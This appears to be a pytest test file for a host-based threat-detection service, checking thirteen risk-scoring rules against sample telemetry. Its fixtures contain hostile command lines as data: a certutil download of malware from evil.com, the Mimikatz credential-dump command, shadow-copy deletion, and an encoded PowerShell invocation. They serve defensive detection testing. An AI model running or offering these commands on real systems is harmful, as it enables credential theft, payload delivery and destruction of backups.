import pytest
from unittest.mock import AsyncMock, MagicMock
from app.services.risk_rules import create_default_registry, RiskRuleRegistry
from app.services.risk_rules.cpu_spike_rule import CpuSpikeRule
from app.services.risk_rules.suspicious_process_rule import SuspiciousProcessRule
from app.services.risk_rules.network_connection_rule import NetworkConnectionRule
from app.services.risk_rules.file_changes_rule import FileChangesRule
from app.services.risk_rules.process_chain_rule import ProcessChainRule
from app.services.risk_rules.injection_rule import InjectionRule
from app.services.risk_rules.living_off_land_rule import LivingOffLandRule
from app.services.risk_rules.registry_rule import RegistryRule
from app.services.risk_rules.credential_dumping_rule import CredentialDumpingRule
from app.services.risk_rules.shadow_copy_rule import ShadowCopyRule
from app.services.risk_rules.c2_communication_rule import C2CommunicationRule
from app.services.risk_rules.lateral_movement_rule import LateralMovementRule
from app.services.risk_rules.mass_file_modification_rule import MassFileModificationRule
from app.schemas.risk import RiskAssessmentDTO

pytestmark = pytest.mark.asyncio


async def test_registry_operations():
    registry = create_default_registry()
    assert len(registry.get_all_rules()) == 13
    assert len(registry.get_enabled_rules()) == 13

    rule = registry.get_rule("cpu_spike")
    assert rule is not None
    assert rule.name == "CPU Spike Anomaly"

    # Disable a rule
    registry.update_rule_config("cpu_spike", enabled=False, weight=2.0)
    assert len(registry.get_enabled_rules()) == 12
    assert rule.enabled is False
    assert rule.weight == 2.0

    # Unregister a rule
    assert registry.unregister("cpu_spike") is True
    assert registry.get_rule("cpu_spike") is None


async def test_cpu_spike_rule():
    rule = CpuSpikeRule()
    # Low CPU
    score, reason = await rule.evaluate({"cpu_usage": 10.0}, {})
    assert score == 0.0

    # Medium CPU
    score, reason = await rule.evaluate({"cpu_usage": 75.0}, {})
    assert score == 15.0
    assert "Elevated CPU" in reason

    # High CPU
    score, reason = await rule.evaluate({"cpu_usage": 92.0}, {})
    assert score == 30.0
    assert "Critical CPU" in reason


async def test_suspicious_process_rule():
    rule = SuspiciousProcessRule()
    mock_intel = MagicMock()
    mock_intel.check_hash = AsyncMock(return_value={"is_malicious": True})
    context = {"threat_intel_service": mock_intel}

    telemetry = {
        "process_list": [
            {"name": "mimikatz.exe", "is_suspicious": True, "hash": "badhash123"}
        ]
    }

    score, reason = await rule.evaluate(telemetry, context)
    assert score >= 65.0  # 25 (suspicious) + 40 (threat intel)
    assert "mimikatz.exe" in reason
    assert "malicious file hashes" in reason


async def test_network_connection_rule():
    rule = NetworkConnectionRule()
    mock_intel = MagicMock()
    mock_intel.check_ip = AsyncMock(return_value={"is_malicious": True})
    context = {"threat_intel_service": mock_intel}

    telemetry = {
        "network_connections": [
            {"dst_port": 4444, "dst_ip": "1.2.3.4"}
        ]
    }

    score, reason = await rule.evaluate(telemetry, context)
    assert score == 50.0  # 20 (port) + 30 (malicious IP)
    assert "suspicious ports" in reason
    assert "malicious IPs" in reason


async def test_file_changes_rule():
    rule = FileChangesRule()
    score, reason = await rule.evaluate({"file_changes_count": 150}, {})
    assert score == 25.0
    assert "Massive file modifications" in reason


async def test_process_chain_rule():
    rule = ProcessChainRule()
    telemetry = {
        "process_tree": [
            {"parent_name": "EXCEL.EXE", "child_name": "cmd.exe"}
        ],
        "process_list": [
            {"name": "powershell.exe", "parent_name": "WINWORD.EXE"}
        ]
    }

    score, reason = await rule.evaluate(telemetry, {})
    assert score > 0.0
    assert "Process chain anomaly detected" in reason
    assert "EXCEL.EXE" in reason or "WINWORD.EXE" in reason


async def test_injection_rule():
    rule = InjectionRule()
    telemetry = {
        "process_list": [
            {"name": "svchost.exe", "pid": 1234, "is_injected": True}
        ]
    }

    score, reason = await rule.evaluate(telemetry, {})
    assert score == 40.0
    assert "Process injection detected" in reason
    assert "svchost.exe" in reason


async def test_living_off_land_rule():
    rule = LivingOffLandRule()
    telemetry = {
        "process_list": [
            {"name": "powershell.exe", "cmdline": "powershell.exe -enc AAAA-EncodedCommand"}
        ],
        "suspicious_commands": ["certutil -urlcache -f http://evil.com/malware.exe"]
    }

    score, reason = await rule.evaluate(telemetry, {})
    assert score > 0.0
    assert "LOLBin execution detected" in reason


async def test_registry_rule():
    rule = RegistryRule()
    telemetry = {
        "registry_changes": [
            {"key_path": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "value_name": "Backdoor"}
        ]
    }

    score, reason = await rule.evaluate(telemetry, {})
    assert score == 25.0
    assert "Suspicious registry modification detected" in reason


async def test_credential_dumping_rule():
    rule = CredentialDumpingRule()
    telemetry = {
        "credential_access_events": [
            {"target_object": "lsass.exe"}
        ],
        "suspicious_commands": ["sekurlsa::logonpasswords"]
    }

    score, reason = await rule.evaluate(telemetry, {})
    assert score > 0.0
    assert "Credential dumping activity detected" in reason


async def test_shadow_copy_rule():
    rule = ShadowCopyRule()
    telemetry = {
        "shadow_copy_deletion": True,
        "suspicious_commands": ["vssadmin delete shadows /all /quiet"]
    }

    score, reason = await rule.evaluate(telemetry, {})
    assert score == 50.0
    assert "Volume Shadow Copy deletion detected" in reason


async def test_c2_communication_rule():
    rule = C2CommunicationRule()
    telemetry = {
        "dns_queries": [{"query": "malicious.duckdns.org"}],
        "network_connections": [{"dst_port": 8443, "dst_ip": "198.51.100.1"}]
    }

    score, reason = await rule.evaluate(telemetry, {})
    assert score > 0.0
    assert "C2 communication indicator detected" in reason


async def test_lateral_movement_rule():
    rule = LateralMovementRule()
    telemetry = {
        "lateral_movement_events": [
            {"event_type": "smb_session", "target_ip": "192.168.1.50"}
        ],
        "network_connections": [
            {"dst_ip": "192.168.1.10", "dst_port": 445},
            {"dst_ip": "192.168.1.20", "dst_port": 135},
            {"dst_ip": "192.168.1.30", "dst_port": 3389}
        ]
    }

    score, reason = await rule.evaluate(telemetry, {})
    assert score > 0.0
    assert "Lateral movement activity detected" in reason


async def test_mass_file_modification_rule():
    rule = MassFileModificationRule()
    telemetry = {
        "mass_file_modification": True,
        "file_changes_count": 250
    }

    score, reason = await rule.evaluate(telemetry, {})
    assert score == 40.0
    assert "Mass file modification" in reason
